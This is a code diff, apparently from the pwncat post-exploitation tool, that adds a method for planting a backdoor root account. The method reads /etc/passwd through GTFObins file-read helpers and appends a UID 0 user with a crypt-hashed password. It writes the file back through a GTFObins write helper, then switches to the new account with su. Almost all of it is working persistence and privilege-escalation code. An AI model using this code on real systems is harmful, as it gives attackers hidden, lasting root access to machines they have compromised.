@@ -5,6 +5,7 @@ import crypt
 from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod, Capability
 from pwncat.privesc.setuid import SetuidMethod
 from pwncat.privesc.sudo import SudoMethod
+from pwncat import downloader
 from pwncat import gtfobins
 from pwncat import util
 
@@ -71,6 +72,56 @@ class Finder:
             ]
 
         return techniques
+
+    def add_backdoor(self):
+        """ Add the backdoor user if it doesn't already exist. This is normally
+        called in order to solidify full UID=0 access (e.g. when SUID binaries
+        yield a EUID=0 but UID!=0. """
+
+        self.pty.reload_users()
+
+        if self.backdoor_user_name not in self.pty.users:
+            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
+            if binary is None:
+                raise PrivescError("no file read methods available from gtfobins")
+
+            # Read the etc/passwd file
+            passwd = self.pty.subprocess(binary.read_file("/etc/passwd"))
+            data = passwd.read()
+            passwd.close()
+
+            # Split up the file by lines
+            data = data.decode("utf-8").strip()
+            data = data.split("\n")
+
+            # Add a new user
+            password = crypt.crypt(self.backdoor_password)
+            user = self.backdoor_user_name
+            data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")
+
+            # Prepare data for transmission
+            data = ("\n".join(data) + "\n").encode("utf-8")
+
+            # Find a GTFObins payload that works
+            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
+            if binary is None:
+                raise PrivescError("no file write methods available from gtfobins")
+
+            # Write the file
+            self.pty.run(binary.write_file("/etc/passwd", data))
+
+            # Stabilize output after the file write
+            self.pty.run("echo")
+
+            # Reload the /etc/passwd data
+            self.pty.reload_users()
+
+            if self.backdoor_user_name not in self.pty.users:
+                raise PrivescError("/etc/passwd update failed!")
+
+        self.pty.process(f"su {self.backdoor_user_name}", delim=False)
+        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
+        self.pty.run("echo")
 
     def write_file(
         self,
